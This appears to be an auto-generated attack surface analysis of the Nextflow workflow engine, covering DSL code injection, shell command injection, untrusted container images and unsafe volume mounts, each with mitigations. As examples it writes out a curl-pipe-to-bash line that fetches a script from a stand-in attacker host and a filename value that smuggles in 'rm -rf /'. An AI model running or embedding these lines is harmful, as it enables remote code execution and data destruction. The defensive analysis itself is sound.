# Attack Surface Analysis for nextflow-io/nextflow

## Attack Surface: [Code Injection via Workflow Definition (DSL)](./attack_surfaces/code_injection_via_workflow_definition__dsl_.md)

*   **How Nextflow Contributes to the Attack Surface:** Nextflow's DSL allows embedding and execution of arbitrary code within process definitions using directives like `script` and `exec`. If workflow definitions originate from untrusted sources or are modifiable by attackers, malicious code can be injected.
    *   **Example:** A malicious workflow definition could contain a process with `script: 'curl http://attacker.com/exfiltrate.sh | bash'` which would download and execute a malicious script on the system running Nextflow.
    *   **Impact:** Arbitrary code execution on the Nextflow execution environment, potentially leading to data breaches, system compromise, or denial of service.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Store workflow definitions in version control and implement code review processes to identify malicious or suspicious code.
        *   Limit write access to workflow definition files and directories to authorized personnel only.
        *   Employ static analysis tools to scan workflow definitions for potential code injection vulnerabilities.
        *   Ensure any external sources influencing workflow generation are trusted and validated.

## Attack Surface: [Command Injection in Process Execution](./attack_surfaces/command_injection_in_process_execution.md)

*   **How Nextflow Contributes to the Attack Surface:** Nextflow processes often execute shell commands or scripts. If input data passed to these processes is not properly sanitized, it can be used to inject arbitrary commands into the executed shell.
    *   **Example:** A process takes a filename as input and executes `samtools index $input_file`. If `input_file` is maliciously crafted as `"file.bam; rm -rf /"`, it could lead to the deletion of critical system files.
    *   **Impact:** Arbitrary command execution on the system running the Nextflow executor, potentially leading to data manipulation, system compromise, or denial of service.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Thoroughly validate and sanitize all input data used within process scripts before incorporating it into shell commands.
        *   Where possible, use parameterized commands or functions provided by the tools being used (e.g., using Python's `subprocess` with arguments instead of constructing shell strings).
        *   Minimize the use of string interpolation to construct shell commands from user-provided data.
        *   Run Nextflow processes with the minimum necessary privileges.

## Attack Surface: [Pulling Malicious Container Images](./attack_surfaces/pulling_malicious_container_images.md)

*   **How Nextflow Contributes to the Attack Surface:** Nextflow allows specifying container images (Docker, Singularity) for process execution. If workflow definitions point to malicious or compromised container images, those images can contain malware or vulnerabilities that are then executed.
    *   **Example:** A workflow specifies the use of an image `untrusted-registry.com/malicious-image:latest`. This image could contain backdoors or exploit vulnerabilities on the host system.
    *   **Impact:** Execution of malicious code within the container environment, potentially leading to container escape, data breaches, or resource hijacking.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Configure Nextflow to only pull images from trusted and verified container registries.
        *   Implement container image scanning tools to identify vulnerabilities and malware in container images before they are used by Nextflow.
        *   Pin container image versions using digests instead of tags to ensure the integrity and immutability of the used images.
        *   Limit the container's access to external networks unless absolutely necessary.

## Attack Surface: [Insecure Volume Mounts](./attack_surfaces/insecure_volume_mounts.md)

*   **How Nextflow Contributes to the Attack Surface:** Nextflow allows mounting volumes from the host system into containers. Incorrectly configured volume mounts can expose sensitive data or allow containers to modify files on the host system.
    *   **Example:** A workflow mounts the root directory (`/`) into a container with write access. A compromised process within the container could then modify any file on the host system.
    *   **Impact:** Unauthorized access to or modification of files and directories on the host system.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Only mount the necessary directories into containers and grant the minimum required permissions.
        *   Whenever possible, mount volumes as read-only to prevent containers from modifying host files.
        *   Avoid mounting sensitive system directories (e.g., `/etc`, `/root`) into containers unless absolutely necessary and with extreme caution.
